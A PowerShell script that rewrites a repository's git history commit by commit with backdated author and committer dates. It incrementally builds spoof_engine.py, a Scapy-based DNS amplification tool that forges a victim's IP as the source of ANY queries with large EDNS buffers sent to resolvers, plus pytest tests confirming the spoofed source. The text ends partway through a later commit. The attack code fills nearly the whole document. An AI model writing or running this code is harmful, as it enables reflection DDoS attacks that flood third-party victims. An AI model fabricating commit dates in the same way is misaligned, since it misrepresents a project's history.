$ErrorActionPreference = "Continue"
$repo = "C:\Users\maico\Documents\GitHub\Meteorain"
Set-Location $repo

function DoCommit($date, $msg) {
    $env:GIT_AUTHOR_DATE = $date
    $env:GIT_COMMITTER_DATE = $date
    git add -A
    git commit -m $msg
    Write-Host "OK: $msg" -ForegroundColor Green
}

# Commit 3: Mar 1
New-Item -ItemType Directory -Force -Path "tests" | Out-Null
[System.IO.File]::WriteAllText("$repo\tests\__init__.py", "")
DoCommit "2026-03-01T10:39:04" "chore: add tests package"

# Commit 4: Mar 2
$c = "import pytest`nimport sys`nimport os`n`nsys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))`n"
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $c)
DoCommit "2026-03-02T10:39:04" "test: add test_spoof_engine module skeleton"

# Commit 5: Mar 3
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-03T10:39:04" "feat: create spoof_engine module with docstring"

# Commit 6: Mar 4
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import sys


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-04T10:39:04" "feat: add platform-aware _is_root() detection"

# Commit 7: Mar 5
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import sys


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-05T10:39:04" "feat: add check_root() privilege guard"

# Commit 8: Mar 6 - add test for check_root raises
$t = @'
import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-06T10:39:04" "test: verify check_root raises PermissionError without privileges"

# Commit 9: Mar 7 - add test for check_root passes
$t = @'
import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()


def test_check_root_passes_as_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: True)
    spoof_engine.check_root()
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-07T10:39:04" "test: verify check_root passes with root privileges"

# Commit 10: Mar 8 - add QTYPE_MAP
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import sys

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-08T10:39:04" "feat: add QTYPE_MAP lookup table to spoof_engine"

# Commit 11: Mar 9 - add _make_txid helper
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-09T10:39:04" "feat: add _make_txid() helper for TXID generation"

# Commit 12: Mar 10 - add scapy imports
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-10T10:39:04" "feat: add scapy imports to spoof_engine"

# Commit 13: Mar 11 - send_spoofed_dns_query stub
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    pass
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-11T10:39:04" "feat: add send_spoofed_dns_query function signature"

# Commit 14: Mar 12 - IP/UDP packet construction
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    ip_layer = IP(src=victim_ip, dst=resolver_ip)
    udp_layer = UDP(sport=victim_src_port, dport=resolver_port)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-12T10:39:04" "feat: build IP/UDP packet layers in send_spoofed_dns_query"

# Commit 15: Mar 13 - DNS question layer
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    ip_layer = IP(src=victim_ip, dst=resolver_ip)
    udp_layer = UDP(sport=victim_src_port, dport=resolver_port)
    pkt = ip_layer / udp_layer / pkt_dns
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-13T10:39:04" "feat: add DNS question layer to spoofed packet"

# Commit 16: Mar 14 - EDNS OPT record
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=0)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-14T10:39:04" "feat: add EDNS OPT record to spoofed packet"

# Commit 17: Mar 15 - DNSSEC DO flag
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-15T10:39:04" "feat: add DNSSEC DO flag support to EDNS record"

# Commit 18: Mar 16 - verbose logging
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-16T10:39:04" "feat: add verbose logging to send_spoofed_dns_query"

# Commit 19: Mar 17 - measure flag
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-17T10:39:04" "feat: add measure flag for packet size reporting"

# Commit 20: Mar 18 - add scapy_send call (complete function)
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-18T10:39:04" "feat: wire scapy_send call to complete send_spoofed_dns_query"

# Commit 21: Mar 19 - test: send calls scapy
$t = @'
import pytest
import sys
import os
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()


def test_check_root_passes_as_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: True)
    spoof_engine.check_root()


def test_send_spoofed_dns_query_calls_scapy_send():
    import spoof_engine
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', victim_src_port=53, qtype='ANY',
            edns_payload=4096, txid=0x1337, id_random=False)
    assert len(sent) == 1
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-19T10:39:04" "test: add test send_spoofed_dns_query calls scapy send once"

# Commit 22: Mar 20 - test: victim IP as source
$t = @'
import pytest
import sys
import os
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()


def test_check_root_passes_as_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: True)
    spoof_engine.check_root()


def test_send_spoofed_dns_query_calls_scapy_send():
    import spoof_engine
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', victim_src_port=53, qtype='ANY',
            edns_payload=4096, txid=0x1337, id_random=False)
    assert len(sent) == 1


def test_victim_ip_is_packet_source():
    import spoof_engine
    from scapy.layers.inet import IP
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='5.5.5.5', victim_src_port=53)
    assert captured[0][IP].src == '5.5.5.5'
    assert captured[0][IP].dst == '8.8.8.8'
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-20T10:39:04" "test: add test victim IP is set as packet source"

# Commit 23: Mar 21 - refactor: rename ip_layer/udp_layer vars (already inlined, touch comment)
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-21T10:39:04" "refactor: add docstring to send_spoofed_dns_query"

# Commit 24: Mar 22 - _time_sleep wrapper
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-22T10:39:04" "feat: add _time_sleep wrapper for testability"

# Commit 25: Mar 23 - threading import
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-23T10:39:04" "feat: add threading import to spoof_engine"

# Commit 26: Mar 24 - send_spoofed_queries_through_resolvers stub
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import threading as _threading
